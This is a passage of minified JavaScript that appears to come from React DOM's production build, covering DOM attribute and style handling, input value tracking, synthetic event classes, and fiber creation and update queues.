s=o[it];if(s)return s;for(var c=o.parentNode;c;){if(s=c[Ni]||c[it]){if(c=s.alternate,s.child!==null||c!==null&&c.child!==null)for(o=wx(o);o!==null;){if(c=o[it])return c;o=wx(o)}return s}o=c,c=o.parentNode}return null}function _n(o){if(o=o[it]||o[Ni]){var s=o.tag;if(s===5||s===6||s===13||s===31||s===26||s===27||s===3)return o}return null}function yn(o){var s=o.tag;if(s===5||s===26||s===27||s===6)return o.stateNode;throw Error(n(33))}function ki(o){var s=o[Jp];return s||(s=o[Jp]={hoistableStyles:new Map,hoistableScripts:new Map}),s}function ot(o){o[_i]=!0}var ru=new Set,lu={};function Oi(o,s){Ui(o,s),Ui(o+"Capture",s)}function Ui(o,s){for(lu[o]=s,o=0;o<s.length;o++)ru.add(s[o])}var cu=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),uu={},du={};function Wp(o){return qa.call(du,o)?!0:qa.call(uu,o)?!1:cu.test(o)?du[o]=!0:(uu[o]=!0,!1)}function yl(o,s,c){if(Wp(s))if(c===null)o.removeAttribute(s);else{switch(typeof c){case"undefined":case"function":case"symbol":o.removeAttribute(s);return;case"boolean":var m=s.toLowerCase().slice(0,5);if(m!=="data-"&&m!=="aria-"){o.removeAttribute(s);return}}o.setAttribute(s,""+c)}}function En(o,s,c){if(c===null)o.removeAttribute(s);else{switch(typeof c){case"undefined":case"function":case"symbol":case"boolean":o.removeAttribute(s);return}o.setAttribute(s,""+c)}}function st(o,s,c,m){if(m===null)o.removeAttribute(c);else{switch(typeof m){case"undefined":case"function":case"symbol":case"boolean":o.removeAttribute(c);return}o.setAttributeNS(s,c,""+m)}}function xt(o){switch(typeof o){case"bigint":case"boolean":case"number":case"string":case"undefined":return o;case"object":return o;default:return""}}function es(o){var s=o.type;return(o=o.nodeName)&&o.toLowerCase()==="input"&&(s==="checkbox"||s==="radio")}function pu(o,s,c){var m=Object.getOwnPropertyDescriptor(o.constructor.prototype,s);if(!o.hasOwnProperty(s)&&typeof m<"u"&&typeof m.get=="function"&&typeof m.set=="function"){var v=m.get,y=m.set;return Object.defineProperty(o,s,{configurable:!0,get:function(){return v.call(this)},set:function(x){c=""+x,y.call(this,x)}}),Object.defineProperty(o,s,{enumerable:m.enumerable}),{getValue:function(){return c},setValue:function(x){c=""+x},stopTracking:function(){o._valueTracker=null,delete o[s]}}}}function Pa(o){if(!o._valueTracker){var s=es(o)?"checked":"value";o._valueTracker=pu(o,s,""+o[s])}}function hr(o){if(!o)return!1;var s=o._valueTracker;if(!s)return!0;var c=s.getValue(),m="";return o&&(m=es(o)?o.checked?"true":"false":o.value),o=m,o!==c?(s.setValue(o),!0):!1}function zi(o){if(o=o||(typeof document<"u"?document:void 0),typeof o>"u")return null;try{return o.activeElement||o.body}catch{return o.body}}var gr=/[\n"\\]/g;function sn(o){return o.replace(gr,function(s){return"\\"+s.charCodeAt(0).toString(16)+" "})}function El(o,s,c,m,v,y,x,D){o.name="",x!=null&&typeof x!="function"&&typeof x!="symbol"&&typeof x!="boolean"?o.type=x:o.removeAttribute("type"),s!=null?x==="number"?(s===0&&o.value===""||o.value!=s)&&(o.value=""+xt(s)):o.value!==""+xt(s)&&(o.value=""+xt(s)):x!=="submit"&&x!=="reset"||o.removeAttribute("value"),s!=null?mu(o,x,xt(s)):c!=null?mu(o,x,xt(c)):m!=null&&o.removeAttribute("value"),v==null&&y!=null&&(o.defaultChecked=!!y),v!=null&&(o.checked=v&&typeof v!="function"&&typeof v!="symbol"),D!=null&&typeof D!="function"&&typeof D!="symbol"&&typeof D!="boolean"?o.name=""+xt(D):o.removeAttribute("name")}function Kp(o,s,c,m,v,y,x,D){if(y!=null&&typeof y!="function"&&typeof y!="symbol"&&typeof y!="boolean"&&(o.type=y),s!=null||c!=null){if(!(y!=="submit"&&y!=="reset"||s!=null)){Pa(o);return}c=c!=null?""+xt(c):"",s=s!=null?""+xt(s):c,D||s===o.value||(o.value=s),o.defaultValue=s}m=m??v,m=typeof m!="function"&&typeof m!="symbol"&&!!m,o.checked=D?o.checked:!!m,o.defaultChecked=!!m,x!=null&&typeof x!="function"&&typeof x!="symbol"&&typeof x!="boolean"&&(o.name=x),Pa(o)}function mu(o,s,c){s==="number"&&zi(o.ownerDocument)===o||o.defaultValue===""+c||(o.defaultValue=""+c)}function as(o,s,c,m){if(o=o.options,s){s={};for(var v=0;v<c.length;v++)s["$"+c[v]]=!0;for(c=0;c<o.length;c++)v=s.hasOwnProperty("$"+o[c].value),o[c].selected!==v&&(o[c].selected=v),v&&m&&(o[c].defaultSelected=!0)}else{for(c=""+xt(c),s=null,v=0;v<o.length;v++){if(o[v].value===c){o[v].selected=!0,m&&(o[v].defaultSelected=!0);return}s!==null||o[v].disabled||(s=o[v])}s!==null&&(s.selected=!0)}}function Yp(o,s,c){if(s!=null&&(s=""+xt(s),s!==o.value&&(o.value=s),c==null)){o.defaultValue!==s&&(o.defaultValue=s);return}o.defaultValue=c!=null?""+xt(c):""}function ts(o,s,c,m){if(s==null){if(m!=null){if(c!=null)throw Error(n(92));if(me(m)){if(1<m.length)throw Error(n(93));m=m[0]}c=m}c==null&&(c=""),s=c}c=xt(s),o.defaultValue=c,m=o.textContent,m===c&&m!==""&&m!==null&&(o.value=m),Pa(o)}function rn(o,s){if(s){var c=o.firstChild;if(c&&c===o.lastChild&&c.nodeType===3){c.nodeValue=s;return}}o.textContent=s}var $p=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function fu(o,s,c){var m=s.indexOf("--")===0;c==null||typeof c=="boolean"||c===""?m?o.setProperty(s,""):s==="float"?o.cssFloat="":o[s]="":m?o.setProperty(s,c):typeof c!="number"||c===0||$p.has(s)?s==="float"?o.cssFloat=c:o[s]=(""+c).trim():o[s]=c+"px"}function hu(o,s,c){if(s!=null&&typeof s!="object")throw Error(n(62));if(o=o.style,c!=null){for(var m in c)!c.hasOwnProperty(m)||s!=null&&s.hasOwnProperty(m)||(m.indexOf("--")===0?o.setProperty(m,""):m==="float"?o.cssFloat="":o[m]="");for(var v in s)m=s[v],s.hasOwnProperty(v)&&c[v]!==m&&fu(o,v,m)}else for(var y in s)s.hasOwnProperty(y)&&fu(o,y,s[y])}function Sl(o){if(o.indexOf("-")===-1)return!1;switch(o){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Xp=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),ns=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function Cl(o){return ns.test(""+o)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":o}function ri(){}var gu=null;function qn(o){return o=o.target||o.srcElement||window,o.correspondingUseElement&&(o=o.correspondingUseElement),o.nodeType===3?o.parentNode:o}var is=null,Bi=null;function br(o){var s=_n(o);if(s&&(o=s.stateNode)){var c=o[Tt]||null;e:switch(o=s.stateNode,s.type){case"input":if(El(o,c.value,c.defaultValue,c.defaultValue,c.checked,c.defaultChecked,c.type,c.name),s=c.name,c.type==="radio"&&s!=null){for(c=o;c.parentNode;)c=c.parentNode;for(c=c.querySelectorAll('input[name="'+sn(""+s)+'"][type="radio"]'),s=0;s<c.length;s++){var m=c[s];if(m!==o&&m.form===o.form){var v=m[Tt]||null;if(!v)throw Error(n(90));El(m,v.value,v.defaultValue,v.defaultValue,v.checked,v.defaultChecked,v.type,v.name)}}for(s=0;s<c.length;s++)m=c[s],m.form===o.form&&hr(m)}break e;case"textarea":Yp(o,c.value,c.defaultValue);break e;case"select":s=c.value,s!=null&&as(o,!!c.multiple,s,!1)}}}var Tl=!1;function os(o,s,c){if(Tl)return o(s,c);Tl=!0;try{var m=o(s);return m}finally{if(Tl=!1,(is!==null||Bi!==null)&&(Gm(),is&&(s=is,o=Bi,Bi=is=null,br(s),o)))for(s=0;s<o.length;s++)br(o[s])}}function li(o,s){var c=o.stateNode;if(c===null)return null;var m=c[Tt]||null;if(m===null)return null;c=m[s];e:switch(s){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(m=!m.disabled)||(o=o.type,m=!(o==="button"||o==="input"||o==="select"||o==="textarea")),o=!m;break e;default:o=!1}if(o)return null;if(c&&typeof c!="function")throw Error(n(231,s,typeof c));return c}var kn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),vr=!1;if(kn)try{var Ia={};Object.defineProperty(Ia,"passive",{get:function(){vr=!0}}),window.addEventListener("test",Ia,Ia),window.removeEventListener("test",Ia,Ia)}catch{vr=!1}var Fi=null,bu=null,yr=null;function vu(){if(yr)return yr;var o,s=bu,c=s.length,m,v="value"in Fi?Fi.value:Fi.textContent,y=v.length;for(o=0;o<c&&s[o]===v[o];o++);var x=c-o;for(m=1;m<=x&&s[c-m]===v[y-m];m++);return yr=v.slice(o,1<m?1-m:void 0)}function Er(o){var s=o.keyCode;return"charCode"in o?(o=o.charCode,o===0&&s===13&&(o=13)):o=s,o===10&&(o=13),32<=o||o===13?o:0}function go(){return!0}function ci(){return!1}function Dt(o){function s(c,m,v,y,x){this._reactName=c,this._targetInst=v,this.type=m,this.nativeEvent=y,this.target=x,this.currentTarget=null;for(var D in o)o.hasOwnProperty(D)&&(c=o[D],this[D]=c?c(y):y[D]);return this.isDefaultPrevented=(y.defaultPrevented!=null?y.defaultPrevented:y.returnValue===!1)?go:ci,this.isPropagationStopped=ci,this}return h(s.prototype,{preventDefault:function(){this.defaultPrevented=!0;var c=this.nativeEvent;c&&(c.preventDefault?c.preventDefault():typeof c.returnValue!="unknown"&&(c.returnValue=!1),this.isDefaultPrevented=go)},stopPropagation:function(){var c=this.nativeEvent;c&&(c.stopPropagation?c.stopPropagation():typeof c.cancelBubble!="unknown"&&(c.cancelBubble=!0),this.isPropagationStopped=go)},persist:function(){},isPersistent:go}),s}var bo={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(o){return o.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Vi=Dt(bo),ss=h({},bo,{view:0,detail:0}),yu=Dt(ss),rs,xl,Hi,Al=h({},ss,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:ls,button:0,buttons:0,relatedTarget:function(o){return o.relatedTarget===void 0?o.fromElement===o.srcElement?o.toElement:o.fromElement:o.relatedTarget},movementX:function(o){return"movementX"in o?o.movementX:(o!==Hi&&(Hi&&o.type==="mousemove"?(rs=o.screenX-Hi.screenX,xl=o.screenY-Hi.screenY):xl=rs=0,Hi=o),rs)},movementY:function(o){return"movementY"in o?o.movementY:xl}}),Eu=Dt(Al),Sr=h({},Al,{dataTransfer:0}),Zp=Dt(Sr),em=h({},ss,{relatedTarget:0}),Cr=Dt(em),Su=h({},bo,{animationName:0,elapsedTime:0,pseudoElement:0}),am=Dt(Su),Pl=h({},bo,{clipboardData:function(o){return"clipboardData"in o?o.clipboardData:window.clipboardData}}),tm=Dt(Pl),nm=h({},bo,{data:0}),Gi=Dt(nm),im={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},om={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},sm={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function rm(o){var s=this.nativeEvent;return s.getModifierState?s.getModifierState(o):(o=sm[o])?!!s[o]:!1}function ls(){return rm}var Kt=h({},ss,{key:function(o){if(o.key){var s=im[o.key]||o.key;if(s!=="Unidentified")return s}return o.type==="keypress"?(o=Er(o),o===13?"Enter":String.fromCharCode(o)):o.type==="keydown"||o.type==="keyup"?om[o.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:ls,charCode:function(o){return o.type==="keypress"?Er(o):0},keyCode:function(o){return o.type==="keydown"||o.type==="keyup"?o.keyCode:0},which:function(o){return o.type==="keypress"?Er(o):o.type==="keydown"||o.type==="keyup"?o.keyCode:0}}),lm=Dt(Kt),cm=h({},Al,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),vo=Dt(cm),g=h({},ss,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:ls}),T=Dt(g),P=h({},bo,{propertyName:0,elapsedTime:0,pseudoElement:0}),O=Dt(P),te=h({},Al,{deltaX:function(o){return"deltaX"in o?o.deltaX:"wheelDeltaX"in o?-o.wheelDeltaX:0},deltaY:function(o){return"deltaY"in o?o.deltaY:"wheelDeltaY"in o?-o.wheelDeltaY:"wheelDelta"in o?-o.wheelDelta:0},deltaZ:0,deltaMode:0}),le=Dt(te),Ie=h({},bo,{newState:0,oldState:0}),Ze=Dt(Ie),Xa=[9,13,27,32],Ca=kn&&"CompositionEvent"in window,Fa=null;kn&&"documentMode"in document&&(Fa=document.documentMode);var On=kn&&"TextEvent"in window&&!Fa,Qi=kn&&(!Ca||Fa&&8<Fa&&11>=Fa),ui=" ",di=!1;function Tr(o,s){switch(o){case"keyup":return Xa.indexOf(s.keyCode)!==-1;case"keydown":return s.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ll(o){return o=o.detail,typeof o=="object"&&"data"in o?o.data:null}var Rl=!1;function Eq(o,s){switch(o){case"compositionend":return Ll(s);case"keypress":return s.which!==32?null:(di=!0,ui);case"textInput":return o=s.data,o===ui&&di?null:o;default:return null}}function Sq(o,s){if(Rl)return o==="compositionend"||!Ca&&Tr(o,s)?(o=vu(),yr=bu=Fi=null,Rl=!1,o):null;switch(o){case"paste":return null;case"keypress":if(!(s.ctrlKey||s.altKey||s.metaKey)||s.ctrlKey&&s.altKey){if(s.char&&1<s.char.length)return s.char;if(s.which)return String.fromCharCode(s.which)}return null;case"compositionend":return Qi&&s.locale!=="ko"?null:s.data;default:return null}}var Cq={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function MS(o){var s=o&&o.nodeName&&o.nodeName.toLowerCase();return s==="input"?!!Cq[o.type]:s==="textarea"}function NS(o,s,c,m){is?Bi?Bi.push(m):Bi=[m]:is=m,s=Xm(s,"onChange"),0<s.length&&(c=new Vi("onChange","change",null,c,m),o.push({event:c,listeners:s}))}var Cu=null,Tu=null;function Tq(o){gx(o,0)}function um(o){var s=yn(o);if(hr(s))return o}function _S(o,s){if(o==="change")return s}var qS=!1;if(kn){var Ng;if(kn){var _g="oninput"in document;if(!_g){var kS=document.createElement("div");kS.setAttribute("oninput","return;"),_g=typeof kS.oninput=="function"}Ng=_g}else Ng=!1;qS=Ng&&(!document.documentMode||9<document.documentMode)}function OS(){Cu&&(Cu.detachEvent("onpropertychange",US),Tu=Cu=null)}function US(o){if(o.propertyName==="value"&&um(Tu)){var s=[];NS(s,Tu,o,qn(o)),os(Tq,s)}}function xq(o,s,c){o==="focusin"?(OS(),Cu=s,Tu=c,Cu.attachEvent("onpropertychange",US)):o==="focusout"&&OS()}function Aq(o){if(o==="selectionchange"||o==="keyup"||o==="keydown")return um(Tu)}function Pq(o,s){if(o==="click")return um(s)}function Lq(o,s){if(o==="input"||o==="change")return um(s)}function Rq(o,s){return o===s&&(o!==0||1/o===1/s)||o!==o&&s!==s}var Sn=typeof Object.is=="function"?Object.is:Rq;function xu(o,s){if(Sn(o,s))return!0;if(typeof o!="object"||o===null||typeof s!="object"||s===null)return!1;var c=Object.keys(o),m=Object.keys(s);if(c.length!==m.length)return!1;for(m=0;m<c.length;m++){var v=c[m];if(!qa.call(s,v)||!Sn(o[v],s[v]))return!1}return!0}function zS(o){for(;o&&o.firstChild;)o=o.firstChild;return o}function BS(o,s){var c=zS(o);o=0;for(var m;c;){if(c.nodeType===3){if(m=o+c.textContent.length,o<=s&&m>=s)return{node:c,offset:s-o};o=m}e:{for(;c;){if(c.nextSibling){c=c.nextSibling;break e}c=c.parentNode}c=void 0}c=zS(c)}}function FS(o,s){return o&&s?o===s?!0:o&&o.nodeType===3?!1:s&&s.nodeType===3?FS(o,s.parentNode):"contains"in o?o.contains(s):o.compareDocumentPosition?!!(o.compareDocumentPosition(s)&16):!1:!1}function VS(o){o=o!=null&&o.ownerDocument!=null&&o.ownerDocument.defaultView!=null?o.ownerDocument.defaultView:window;for(var s=zi(o.document);s instanceof o.HTMLIFrameElement;){try{var c=typeof s.contentWindow.location.href=="string"}catch{c=!1}if(c)o=s.contentWindow;else break;s=zi(o.document)}return s}function qg(o){var s=o&&o.nodeName&&o.nodeName.toLowerCase();return s&&(s==="input"&&(o.type==="text"||o.type==="search"||o.type==="tel"||o.type==="url"||o.type==="password")||s==="textarea"||o.contentEditable==="true")}var Iq=kn&&"documentMode"in document&&11>=document.documentMode,Il=null,kg=null,Au=null,Og=!1;function HS(o,s,c){var m=c.window===c?c.document:c.nodeType===9?c:c.ownerDocument;Og||Il==null||Il!==zi(m)||(m=Il,"selectionStart"in m&&qg(m)?m={start:m.selectionStart,end:m.selectionEnd}:(m=(m.ownerDocument&&m.ownerDocument.defaultView||window).getSelection(),m={anchorNode:m.anchorNode,anchorOffset:m.anchorOffset,focusNode:m.focusNode,focusOffset:m.focusOffset}),Au&&xu(Au,m)||(Au=m,m=Xm(kg,"onSelect"),0<m.length&&(s=new Vi("onSelect","select",null,s,c),o.push({event:s,listeners:m}),s.target=Il)))}function xr(o,s){var c={};return c[o.toLowerCase()]=s.toLowerCase(),c["Webkit"+o]="webkit"+s,c["Moz"+o]="moz"+s,c}var wl={animationend:xr("Animation","AnimationEnd"),animationiteration:xr("Animation","AnimationIteration"),animationstart:xr("Animation","AnimationStart"),transitionrun:xr("Transition","TransitionRun"),transitionstart:xr("Transition","TransitionStart"),transitioncancel:xr("Transition","TransitionCancel"),transitionend:xr("Transition","TransitionEnd")},Ug={},GS={};kn&&(GS=document.createElement("div").style,"AnimationEvent"in window||(delete wl.animationend.animation,delete wl.animationiteration.animation,delete wl.animationstart.animation),"TransitionEvent"in window||delete wl.transitionend.transition);function Ar(o){if(Ug[o])return Ug[o];if(!wl[o])return o;var s=wl[o],c;for(c in s)if(s.hasOwnProperty(c)&&c in GS)return Ug[o]=s[c];return o}var QS=Ar("animationend"),JS=Ar("animationiteration"),WS=Ar("animationstart"),wq=Ar("transitionrun"),jq=Ar("transitionstart"),Dq=Ar("transitioncancel"),KS=Ar("transitionend"),YS=new Map,zg="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");zg.push("scrollEnd");function pi(o,s){YS.set(o,s),Oi(s,[o])}var dm=typeof reportError=="function"?reportError:function(o){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var s=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof o=="object"&&o!==null&&typeof o.message=="string"?String(o.message):String(o),error:o});if(!window.dispatchEvent(s))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",o);return}console.error(o)},Un=[],jl=0,Bg=0;function pm(){for(var o=jl,s=Bg=jl=0;s<o;){var c=Un[s];Un[s++]=null;var m=Un[s];Un[s++]=null;var v=Un[s];Un[s++]=null;var y=Un[s];if(Un[s++]=null,m!==null&&v!==null){var x=m.pending;x===null?v.next=v:(v.next=x.next,x.next=v),m.pending=v}y!==0&&$S(c,v,y)}}function mm(o,s,c,m){Un[jl++]=o,Un[jl++]=s,Un[jl++]=c,Un[jl++]=m,Bg|=m,o.lanes|=m,o=o.alternate,o!==null&&(o.lanes|=m)}function Fg(o,s,c,m){return mm(o,s,c,m),fm(o)}function Pr(o,s){return mm(o,null,null,s),fm(o)}function $S(o,s,c){o.lanes|=c;var m=o.alternate;m!==null&&(m.lanes|=c);for(var v=!1,y=o.return;y!==null;)y.childLanes|=c,m=y.alternate,m!==null&&(m.childLanes|=c),y.tag===22&&(o=y.stateNode,o===null||o._visibility&1||(v=!0)),o=y,y=y.return;return o.tag===3?(y=o.stateNode,v&&s!==null&&(v=31-We(c),o=y.hiddenUpdates,m=o[v],m===null?o[v]=[s]:m.push(s),s.lane=c|536870912),y):null}function fm(o){if(50<Ju)throw Ju=0,$b=null,Error(n(185));for(var s=o.return;s!==null;)o=s,s=o.return;return o.tag===3?o.stateNode:null}var Dl={};function Mq(o,s,c,m){this.tag=o,this.key=c,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=s,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=m,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Cn(o,s,c,m){return new Mq(o,s,c,m)}function Vg(o){return o=o.prototype,!(!o||!o.isReactComponent)}function yo(o,s){var c=o.alternate;return c===null?(c=Cn(o.tag,s,o.key,o.mode),c.elementType=o.elementType,c.type=o.type,c.stateNode=o.stateNode,c.alternate=o,o.alternate=c):(c.pendingProps=s,c.type=o.type,c.flags=0,c.subtreeFlags=0,c.deletions=null),c.flags=o.flags&65011712,c.childLanes=o.childLanes,c.lanes=o.lanes,c.child=o.child,c.memoizedProps=o.memoizedProps,c.memoizedState=o.memoizedState,c.updateQueue=o.updateQueue,s=o.dependencies,c.dependencies=s===null?null:{lanes:s.lanes,firstContext:s.firstContext},c.sibling=o.sibling,c.index=o.index,c.ref=o.ref,c.refCleanup=o.refCleanup,c}function XS(o,s){o.flags&=65011714;var c=o.alternate;return c===null?(o.childLanes=0,o.lanes=s,o.child=null,o.subtreeFlags=0,o.memoizedProps=null,o.memoizedState=null,o.updateQueue=null,o.dependencies=null,o.stateNode=null):(o.childLanes=c.childLanes,o.lanes=c.lanes,o.child=c.child,o.subtreeFlags=0,o.deletions=null,o.memoizedProps=c.memoizedProps,o.memoizedState=c.memoizedState,o.updateQueue=c.updateQueue,o.type=c.type,s=c.dependencies,o.dependencies=s===null?null:{lanes:s.lanes,firstContext:s.firstContext}),o}function hm(o,s,c,m,v,y){var x=0;if(m=o,typeof o=="function")Vg(o)&&(x=1);else if(typeof o=="string")x=Ok(o,c,Re.current)?26:o==="html"||o==="head"||o==="body"?27:5;else e:switch(o){case N:return o=Cn(31,c,s,v),o.elementType=N,o.lanes=y,o;case j:return Lr(c.children,v,y,s);case R:x=8,v|=24;break;case I:return o=Cn(12,c,s,v|2),o.elementType=I,o.lanes=y,o;case ee:return o=Cn(13,c,s,v),o.elementType=ee,o.lanes=y,o;case Q:return o=Cn(19,c,s,v),o.elementType=Q,o.lanes=y,o;default:if(typeof o=="object"&&o!==null)switch(o.$$typeof){case k:x=10;break e;case w:x=9;break e;case Y:x=11;break e;case q:x=14;break e;case M:x=16,m=null;break e}x=29,c=Error(n(130,o===null?"null":typeof o,"")),m=null}return s=Cn(x,c,s,v),s.elementType=o,s.type=m,s.lanes=y,s}function Lr(o,s,c,m){return o=Cn(7,o,m,s),o.lanes=c,o}function Hg(o,s,c){return o=Cn(6,o,null,s),o.lanes=c,o}function ZS(o){var s=Cn(18,null,null,0);return s.stateNode=o,s}function Gg(o,s,c){return s=Cn(4,o.children!==null?o.children:[],o.key,s),s.lanes=c,s.stateNode={containerInfo:o.containerInfo,pendingChildren:null,implementation:o.implementation},s}var eC=new WeakMap;function zn(o,s){if(typeof o=="object"&&o!==null){var c=eC.get(o);return c!==void 0?c:(s={value:o,source:s,stack:mo(s)},eC.set(o,s),s)}return{value:o,source:s,stack:mo(s)}}var Ml=[],Nl=0,gm=null,Pu=0,Bn=[],Fn=0,cs=null,Ji=1,Wi="";function Eo(o,s){Ml[Nl++]=Pu,Ml[Nl++]=gm,gm=o,Pu=s}function aC(o,s,c){Bn[Fn++]=Ji,Bn[Fn++]=Wi,Bn[Fn++]=cs,cs=o;var m=Ji;o=Wi;var v=32-We(m)-1;m&=~(1<<v),c+=1;var y=32-We(s)+v;if(30<y){var x=v-v%5;y=(m&(1<<x)-1).toString(32),m>>=x,v-=x,Ji=1<<32-We(s)+v|c<<v|m,Wi=y+o}else Ji=1<<y|c<<v|m,Wi=o}function Qg(o){o.return!==null&&(Eo(o,1),aC(o,1,0))}function 